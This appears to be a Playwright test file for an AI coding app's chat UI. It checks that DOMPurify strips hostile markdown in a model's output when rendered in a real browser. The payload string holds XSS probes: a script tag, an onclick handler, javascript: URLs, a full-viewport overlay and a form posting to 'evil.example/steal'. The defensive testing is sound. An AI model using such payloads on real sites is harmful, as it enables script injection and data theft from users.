import { expect, test, type Page } from "@playwright/test"
import { mockAigcfrogeServer } from "../utils/mock-server"
import { expectSessionTitle } from "../utils/waits"

// S1 B1/B3：不可信 markdown（模型输出 + 工具输出）的消毒证据必须在真实浏览器里钉。
// 单测跑在 happy-dom 上，而 DOMPurify 依赖 live NodeIterator、happy-dom 的 iterator
// 在当前节点被 removeChild 后失效 —— 只要 payload 前面有元素被删除，它之后的节点就
// 完全跳过属性消毒（实测 onclick / javascript: / style 全部存活）。所以「遮罩盖不住
// 提示框」「KaTeX 还能渲染」这两件事只有真实 Chromium + 真实几何能证明。
// 两道防线：markdown-cache.tsx 的 OUT_OF_FLOW_POSITIONS（属性层）+
// markdown.css 的 contain: layout（结构层，容器成为定位包含块与层叠上下文）。
const directory = "C:/Aigcfroge/MarkdownSanitize"
const sessionID = "ses_md_sanitize"
const title = "Markdown sanitize"

const model = { providerID: "aigcfroge", modelID: "claude-opus-4-6", variant: "max" }

const session = {
  id: sessionID,
  slug: "markdown-sanitize",
  projectID: "proj_md_sanitize",
  directory,
  mode: "work",
  title,
  version: "dev",
  time: { created: 1700000000000, updated: 1700000000000 },
}

const base64Encode = (value: string) =>
  Buffer.from(value, "utf8").toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "")

const provider = {
  all: [
    {
      id: "aigcfroge",
      label: "AigcForge",
      models: [
        { id: "claude-opus-4-6", label: "Claude Opus 4.6", mode: "chat", variants: [{ id: "max", label: "Max" }] },
      ],
    },
  ],
  default: "aigcfroge",
}

const project = {
  id: "proj_md_sanitize",
  worktree: directory,
  vcs: "git",
  name: "MarkdownSanitize",
  time: { created: 1700000000000, updated: 1700000000000 },
  sandboxes: [],
}

// 一条消息同时携带多类载荷：无关前缀、脚本、事件处理器、javascript: URL、危险
// style、遮罩、公式、图片、表单。前缀元素（自定义标签，会被消毒器整体剥掉）刻意
// 放在危险载荷之前——happy-dom 的 NodeIterator 在这种「先删一个再处理后续」的
// 位置上会整段跳过属性消毒（单测文件已注明），真实 Chromium 不会，所以这里逐类
// 断言最终 DOM 才是行为证据。
const payload = `# SANITIZEHEADING

<unknowntag data-prefix="1"></unknowntag>

PREFIXPROBE before the payload.

<script>window.__xss = 1</script>

<p id="handler-probe" onclick="alert(1)">HANDLERPROBE</p>

<a href="javascript:alert(1)">JSPROBE</a>

<p id="danger-style-probe" style="position:fixed;inset:0;z-index:99999;background:url('javascript:alert(1)')">DANGERSTYLEPROBE</p>

<p id="overlay-probe" style="position:fixed;inset:0;z-index:99999">OVERLAYPROBE</p>

公式 $\\frac{a}{b}$ 行内。

![probe](https://example.com/probe.png)

<form action="https://evil.example/steal"><input type="text" name="q"></form>FORMPROBE
`

const message = {
  info: {
    id: "msg_md_1",
    sessionID,
    role: "assistant",
    time: { created: 1700000001000 },
    summary: { diffs: [] },
    parentID: "msg_user_0",
    agent: "work-orchestrator",
    mode: "work",
    model,
    providerID: "aigcfroge",
    path: { cwd: directory, root: directory },
    cost: 0,
    tokens: { input: 0, output: 0, reasoning: 0, cache: { read: 0, write: 0 } },
  },
  parts: [{ id: "prt_md_1", sessionID, messageID: "msg_md_1", type: "text", text: payload }],
}

async function open(page: Page) {
  // Geometry contract: the overlay/KaTeX/form assertions measure real box
  // geometry against the viewport and need the message timeline of the
  // desktop layout. At 390px the session page renders its mobile tabs branch
  // (the changes tab instead of the timeline) — a separate mobile-layout
  // contract covered by mode-slot-fallback-a11y.spec.ts. Pin a desktop
  // viewport here so every matrix project observes the same contract.
  await page.setViewportSize({ width: 1280, height: 720 })
  await page.addInitScript(() => {
    localStorage.setItem("aigcfroge.global.dat:mode-view", JSON.stringify({ currentMode: "work" }))
  })
  await mockAigcfrogeServer(page, {
    directory,
    project,
    provider,
    sessions: [session],
    pageMessages: () => ({ items: [message] }),
    events: () => [],
    eventRetry: 16,
  })
  await page.goto(`/${base64Encode(directory)}/session/${sessionID}`)
  await expectSessionTitle(page, title)
  await expect(page.getByRole("heading", { name: "SANITIZEHEADING" }).first()).toBeVisible({ timeout: 60_000 })
}

test("an injected position:fixed overlay cannot escape the markdown container", async ({ page }) => {
  await open(page)

  // DOMPurify 的 SANITIZE_NAMED_PROPS 会把 id 改写成 user-content-*，所以按文本定位。
  const probe = page.getByText("OVERLAYPROBE")
  await expect(probe).toBeVisible()

  const geometry = await probe.evaluate((node: HTMLElement) => {
    const container = node.closest('[data-component="markdown"]')
    if (!container) throw new Error("payload rendered outside the markdown container")
    const box = node.getBoundingClientRect()
    const bounds = container.getBoundingClientRect()
    const rect = (r: DOMRect) => ({ top: r.top, left: r.left, width: r.width, height: r.height })
    return {
      inlinePosition: node.style.position,
      computedPosition: getComputedStyle(node).position,
      containerContain: getComputedStyle(container).contain,
      box: rect(box),
      bounds: rect(bounds),
      viewport: { width: window.innerWidth, height: window.innerHeight },
    }
  })

  // 属性层：position 声明已被摘掉，inset/z-index 随之失效。
  expect(geometry.inlinePosition).toBe("")
  expect(geometry.computedPosition).toBe("static")
  // 结构层：容器建立了布局包含，即便未来放行了定位也出不了这个盒子。
  expect(geometry.containerContain).toContain("layout")
  // 真实几何：没有铺满视口。
  expect(geometry.box.height).toBeLessThan(geometry.viewport.height / 2)
  expect(geometry.box.width).toBeLessThanOrEqual(geometry.bounds.width + 1)
  expect(geometry.box.top).toBeGreaterThanOrEqual(geometry.bounds.top - 1)
})

test("script, event handlers, javascript: URLs and dangerous styles stay stripped after an unrelated node", async ({
  page,
}) => {
  await open(page)

  const container = page.locator('[data-component="markdown"]').first()

  // 无关前缀元素被整体剥掉，但它后面的危险载荷不能跟着逃逸属性消毒。
  await expect(page.getByText("PREFIXPROBE before the payload.")).toBeVisible()
  await expect(container.locator("unknowntag")).toHaveCount(0)
  await expect(container.locator("script")).toHaveCount(0)

  // 事件处理器属性必须被剥掉，只剩文本。
  await expect(page.getByText("HANDLERPROBE")).toBeVisible()
  await expect(container.locator("[onclick]")).toHaveCount(0)

  // javascript: URL 的 href 必须被 DOMPurify 剥掉（不保留 javascript: 前缀）。
  await expect(page.getByText("JSPROBE")).toBeVisible()
  const hrefs = await container.locator("a[href]").evaluateAll((anchors) =>
    anchors.map((a) => a.getAttribute("href") ?? ""),
  )
  expect(hrefs.some((href) => href.includes("javascript:"))).toBe(false)

  // 危险 style 的真实防线是「出流能力」：position 一旦被摘，元素回文档流，盖不住
  // 权限/提问提示框。background:url('javascript:…') 是惰性残留而非 XSS 向量（CSS
  // url() 不执行 JS，仅当作无效背景图），DOMPurify 保留它无害，这里不断言它被剥。
  const danger = await page.getByText("DANGERSTYLEPROBE").evaluate((node: HTMLElement) => ({
    position: getComputedStyle(node).position,
  }))
  expect(danger.position).toBe("static")
})

test("KaTeX keeps the inline styles its visual layer needs", async ({ page }) => {
  await open(page)

  const katex = page.locator(".katex").first()
  await expect(katex).toBeVisible()
  const math = await katex.evaluate((node) => {
    const styled = Array.from(node.querySelectorAll<HTMLElement>("[style]"))
    const box = node.getBoundingClientRect()
    return {
      styledCount: styled.length,
      properties: [...new Set(styled.flatMap((el) => Array.from(el.style)))].sort(),
      height: box.height,
    }
  })

  // 视觉层靠内联 height/top/vertical-align 定位；整条禁掉 style 会让分子分母叠在一起。
  expect(math.styledCount).toBeGreaterThan(0)
  expect(math.properties).toContain("height")
  expect(math.height).toBeGreaterThan(0)
})

test("images render while form controls stay stripped", async ({ page }) => {
  await open(page)

  await expect(page.locator('[data-component="markdown"] img[alt="probe"]')).toHaveCount(1)
  await expect(page.getByText("FORMPROBE")).toBeVisible()
  await expect(page.locator('[data-component="markdown"] form')).toHaveCount(0)
  await expect(page.locator('[data-component="markdown"] input')).toHaveCount(0)
})
